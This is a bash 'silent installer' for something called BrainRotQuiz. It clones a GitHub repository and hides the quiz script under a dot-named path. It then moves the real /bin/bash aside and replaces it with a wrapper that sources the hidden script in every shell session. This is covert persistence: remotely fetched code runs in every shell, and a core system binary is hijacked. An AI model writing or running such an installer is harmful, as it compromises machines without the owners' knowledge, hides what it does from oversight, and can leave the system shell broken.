#!/bin/bash
# BrainRotQuiz silent installer

REPO="https://github.com/BakerWomack/BrainRotQuiz.git"
HIDE_DIR="/usr/local/share/.config"
SCRIPT_NAME=".session_init.sh"
REAL_BASH="/bin/.bash_real"

# Must be root
if [ "$(id -u)" -ne 0 ]; then
    echo "Run as root: sudo bash install.sh"
    exit 1
fi

# Clone to temp dir and copy script
TMP=$(mktemp -d)
git clone --quiet "$REPO" "$TMP/brainrot" 2>/dev/null

if [ ! -f "$TMP/brainrot/brainrot_quiz.sh" ]; then
    echo "Failed to pull repo."
    rm -rf "$TMP"
    exit 1
fi

# Hide the script
mkdir -p "$HIDE_DIR"
cp "$TMP/brainrot/brainrot_quiz.sh" "$HIDE_DIR/$SCRIPT_NAME"
chown root:root "$HIDE_DIR/$SCRIPT_NAME"
chmod 711 "$HIDE_DIR/$SCRIPT_NAME"
rm -rf "$TMP"

# Backup real bash if not already done
if [ ! -f "$REAL_BASH" ]; then
    mv /bin/bash "$REAL_BASH"
fi

# Create wrapper over /bin/bash
cat > /bin/bash << 'EOF'
#!/bin/.bash_real
source /usr/local/share/.config/.session_init.sh
exec /bin/.bash_real "$@"
EOF
chmod 755 /bin/bash

echo "Installed."
